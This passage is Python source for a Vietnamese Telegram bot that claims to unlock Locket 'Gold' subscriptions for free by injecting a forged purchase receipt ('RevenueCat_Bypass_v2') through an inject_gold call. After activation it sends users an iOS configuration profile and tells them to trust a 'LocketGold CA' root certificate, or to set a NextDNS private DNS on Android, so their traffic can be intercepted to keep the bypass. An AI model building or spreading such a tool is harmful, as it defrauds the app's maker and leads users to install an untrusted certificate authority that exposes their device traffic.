                return False, err


# ──────────────────────────────────────────
# HELPERS — xoá message an toàn
# ──────────────────────────────────────────

async def safe_delete(msg):
    try:
        await msg.delete()
    except Exception:
        pass


# ──────────────────────────────────────────
# BOT HANDLERS
# ──────────────────────────────────────────

async def cmd_start(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    ctx.user_data["activated"] = True
    kb = InlineKeyboardMarkup([
        [InlineKeyboardButton("🏅 Nhập User Locket", callback_data="nhap_user")],
        [
            InlineKeyboardButton("🌐 Đổi Ngôn Ngữ", callback_data="ngonngu"),
            InlineKeyboardButton("🆘 Hỗ Trợ", url=f"https://zalo.me/{ZALO}"),
        ],
    ])
    await update.message.reply_text(
        f"🟢 <b>{SHOP_NAME}</b>\n\n"
        f"Chào mừng! Vui lòng chọn ngôn ngữ hoặc sử dụng menu bên dưới.\n\n"
        f"Tham gia nhóm chat: https://t.me/gocnholocket",
        parse_mode="HTML",
        reply_markup=kb
    )

async def cmd_kick(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id not in ADMIN_IDS:
        return
    if not ctx.args:
        await update.message.reply_text("Dùng: /kick <username>")
        return
    username = ctx.args[0]
    msg = await update.message.reply_text(
        f"{E_LOADING} Đang xử lý <code>{username}</code>...", parse_mode="HTML"
    )
    uid = await resolve_uid(username)
    if not uid:
        await safe_delete(msg)
        await update.message.reply_text(
            f"{E_ERROR} Không tìm thấy UID cho <code>{username}</code>", parse_mode="HTML"
        )
        return
    ok, result = await inject_gold(uid)
    await safe_delete(msg)
    if ok:
        await update.message.reply_text(
            f"{E_SUCCESS} Kick thành công!\n\n"
            f"{E_USER} <code>@{username}</code>\n"
            f"{E_ID} <code>{uid}</code>",
            parse_mode="HTML"
        )
    else:
        await update.message.reply_text(
            f"{E_ERROR} Thất bại: {result}", parse_mode="HTML"
        )

async def handle_message(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not ctx.user_data.get("activated"):
        return

    text = update.message.text.strip()

    if not ctx.user_data.get("waiting_username"):
        # Tin nhắn thường → hiện menu
        kb = InlineKeyboardMarkup([
            [InlineKeyboardButton("🏅 Nhập User Locket", callback_data="nhap_user")],
            [
                InlineKeyboardButton("🌐 Đổi Ngôn Ngữ", callback_data="ngonngu"),
                InlineKeyboardButton("🆘 Hỗ Trợ", url=f"https://zalo.me/{ZALO}"),
            ],
        ])
        await update.message.reply_text(
            f"🟢 <b>{SHOP_NAME}</b>\n\nVui lòng sử dụng menu bên dưới.",
            parse_mode="HTML",
            reply_markup=kb
        )
        return

    # ── Đang chờ username ──────────────────
    ctx.user_data["waiting_username"] = False
    username = text.lstrip('@')
    if 'locket.cam/' in username:
        username = username.split('locket.cam/')[-1].split('?')[0]

    user_id = update.effective_user.id

    # Bước 1: Resolving
    m1 = await update.message.reply_text(
        f"{E_LOADING} <b>Đang phân giải UID...</b>\n"
        f"<code>Target: {username}</code>",
        parse_mode="HTML"
    )
    uid = await resolve_uid(username)
    await safe_delete(m1)

    if not uid:
        await update.message.reply_text(
            f"{E_ERROR} Không tìm thấy tài khoản <code>{username}</code>\n\n"
            f"Hãy kiểm tra lại username hoặc link.",
            parse_mode="HTML"
        )
        return

    # Bước 2: Checking entitlement
    m2 = await update.message.reply_text(
        f"{E_LOADING} <b>Đang kiểm tra Entitlement...</b>\n"
        f"<code>UID: {uid}</code>",
        parse_mode="HTML"
    )
    gold_info = await check_gold(uid)
    await safe_delete(m2)

    # Bước 3: Kiểm tra giới hạn
    allowed, remaining = check_limit(user_id)
    used = get_used(user_id)

    if not allowed:
        await update.message.reply_text(
            f"{E_LIMIT} <b>Đã hết lượt hôm nay!</b>\n\n"
            f"Bạn đã dùng hết <b>{DAILY_LIMIT}/{DAILY_LIMIT}</b> lượt kích hoạt hôm nay.\n"
            f"Vui lòng quay lại vào ngày mai hoặc liên hệ hỗ trợ.\n\n"
            f"Zalo: <code>{ZALO}</code>",
            parse_mode="HTML"
        )
        return

    # Bước 4: Hiển thị user info + nút kích hoạt
    if gold_info["has_gold"]:
        status_text = f"🏅 Gold ✅  ({gold_info['status']})"
        note = f"\n\n⚠️ Tài khoản này <b>đã có Gold</b>. Bạn vẫn có thể kích hoạt lại để gia hạn."
    else:
        status_text = f"🆓 Free — {gold_info['status']}"
        note = ""

    kb = InlineKeyboardMarkup([[
        InlineKeyboardButton("🚀 KÍCH HOẠT NGAY", callback_data=f"kick_{uid}_{username}")
    ]])

    await update.message.reply_text(
        f"{E_USER} <b>User Information</b>\n\n"
        f"{E_ID} <code>{uid}</code>\n"
        f"{E_TAG} @{username}\n"
        f"{E_STAT} {status_text}\n"
        f"{E_CALENDAR} Đã dùng hôm nay: <b>{used}/{DAILY_LIMIT}</b>"
        f"{note}",
        parse_mode="HTML",
        reply_markup=kb
    )


async def handle_callback(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query

    if not ctx.user_data.get("activated"):
        await q.answer()
        return

    await q.answer()

    if q.data == "nhap_user":
        ctx.user_data["waiting_username"] = True
        await q.message.reply_text(
            f"{E_LOADING} Vui lòng nhập <b>Username</b> hoặc <b>Link Locket</b> "
            f"của bạn vào tin nhắn trả lời bên dưới:",
            parse_mode="HTML",
            reply_markup=ForceReply(selective=True, input_field_placeholder="Username hoặc link locket.cam/...")
        )

    elif q.data == "ngonngu":
        await q.message.reply_text(
            "🌐 Hiện tại bot đang dùng <b>Tiếng Việt</b>.",
            parse_mode="HTML"
        )

    elif q.data.startswith("kick_"):
        parts = q.data.split("_", 2)
        uid      = parts[1]
        username = parts[2] if len(parts) > 2 else "unknown"
        user_id  = q.from_user.id

        # Xoá nút kích hoạt
        await q.message.edit_reply_markup(reply_markup=None)

        # Kiểm tra giới hạn lần nữa
        allowed, _ = check_limit(user_id)
        if not allowed and user_id not in ADMIN_IDS:
            await q.message.reply_text(
                f"{E_LIMIT} <b>Đã hết lượt hôm nay!</b>\n\n"
                f"Vui lòng quay lại vào ngày mai.\n\nZalo: <code>{ZALO}</code>",
                parse_mode="HTML"
            )
            return

        # ── Step 1 ──────────────────────────
        m1 = await q.message.reply_text(
            f"{E_LOADING} <b>⚡ SYSTEM EXPLOIT RUNNING...</b>\n"
            f"<pre>[*] Target:  {username}\n"
            f"[*] Method:  RevenueCat_Bypass_v2\n"
            f"[>] Action:  Resolving UID...\n"
            f"[?] Status:  Connecting...</pre>",
            parse_mode="HTML"
        )
        await asyncio.sleep(0.9)
        await safe_delete(m1)

        # ── Step 2 ──────────────────────────
        m2 = await q.message.reply_text(
            f"{E_LOADING} <b>⚡ SYSTEM EXPLOIT RUNNING...</b>\n"
            f"<pre>[*] Target:  {username}\n"
            f"[✓] UID:     {uid}\n"
            f"[>] Action:  Injecting Malicious Receipt\n"
            f"[>] Status:  Bypassing Validation...\n"
            f"[?] Waiting: Server Response...</pre>",
            parse_mode="HTML"
        )
        await asyncio.sleep(1.0)
        await safe_delete(m2)

        # ── Step 3: gọi API ─────────────────
        m3 = await q.message.reply_text(
            f"{E_LOADING} <b>⚡ SYSTEM EXPLOIT RUNNING...</b>\n"
            f"<pre>[✓] UID:     {uid}\n"
            f"[>] Attempt 1/5: Sending Receipt...\n"
            f"[>] Attempt 2/5: Sending Receipt...\n"
            f"[>] Attempt 3/5: Sending Receipt...\n"
            f"[?] Processing final response...</pre>",
            parse_mode="HTML"
        )

        ok, result = await inject_gold(uid)
        await safe_delete(m3)

        if ok:
            add_usage(user_id)

            # ── Step 4: success ─────────────
            m4 = await q.message.reply_text(
                f"{E_SUCCESS} <b>KÍCH HOẠT THÀNH CÔNG</b>\n\n"
                f"{E_USER} <code>@{username}</code>\n"
                f"🏅 Plan: <b>Gold</b> (Hết hạn 14/08/2027)\n\n"
                f"{E_SHIELD} <b>HƯỚNG DẪN QUAN TRỌNG:</b>",
                parse_mode="HTML"
            )
            await asyncio.sleep(0.8)
            await safe_delete(m4)

            # ── Step 5: DNS instructions ────
            await q.message.reply_text(
                f"{E_SUCCESS} <b>KÍCH HOẠT THÀNH CÔNG</b>\n\n"
                f"{E_USER} <code>@{username}</code>\n"
                f"🏅 Plan: <b>Gold</b> (Hết hạn 14/08/2027)\n\n"
                f"{E_SHIELD} <b>HƯỚNG DẪN QUAN TRỌNG:</b>\n"
                f"1️⃣ Vào App Locket kiểm tra đã có <b>Gold</b> chưa.\n"
                f"2️⃣ Cài <b>DNS ngay</b> để không bị mất Gold:\n\n"
                f"{E_IOS} <b>iOS:</b> Mở file bên dưới bằng Safari → Cho phép → Cài đặt\n"
                f"⚠️ Sau đó: Cài đặt → Cài đặt chung → Giới thiệu → "
                f"Cài đặt tin cậy chứng chỉ → Bật <b>LocketGold CA</b>\n\n"
                f"{E_ANDROID} <b>Android:</b> <code>782aa4.dns.nextdns.io</code>\n"
                f"(Cài đặt → Mạng → Private DNS)\n\n"
                f"{E_TIP} Bắt buộc cài DNS để không bị mất Gold!\n\n"
                f"Tham gia nhóm chat: https://t.me/gocnholocket",
                parse_mode="HTML"
            )

            try:
                with open("Vandunggold.mobileconfig", "rb") as f:
                    await q.message.reply_document(
                        document=f,
                        filename="Vandunggold.mobileconfig",
                        caption=(
                            f"{E_IOS} File DNS cho iOS\n"
                            f"1. Mở bằng Safari → Cho phép → Cài đặt\n"
                            f"2. Cài đặt → Cài đặt chung → Giới thiệu → "
                            f"Cài đặt tin cậy chứng chỉ → Bật LocketGold CA\n"
                            f"⚠️ Bắt buộc bật chứng chỉ tin cậy để giữ Gold!"
                        )
                    )
            except FileNotFoundError:
                pass

        else:
            await q.message.reply_text(
                f"{E_ERROR} <b>Kích hoạt thất bại</b>\n\n"
                f"<code>{result}</code>\n\n"
                f"Liên hệ Zalo <code>{ZALO}</code> để được hỗ trợ.",
                parse_mode="HTML"
            )


# ──────────────────────────────────────────
# MAIN
# ──────────────────────────────────────────

def main():
    print(f"[*] {SHOP_NAME} Bot đang khởi động...")
    app = Application.builder().token(BOT_TOKEN).build()
    app.add_handler(CommandHandler("start", cmd_start))
    app.add_handler(CommandHandler("kick", cmd_kick))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
    app.add_handler(MessageHandler(filters.REPLY & filters.TEXT, handle_message))
    app.add_handler(CallbackQueryHandler(handle_callback))
    print(f"[*] Bot đang chạy. Nhấn Ctrl+C để dừng.")
    app.run_polling(drop_pending_updates=True)

if __name__ == "__main__":
    main()
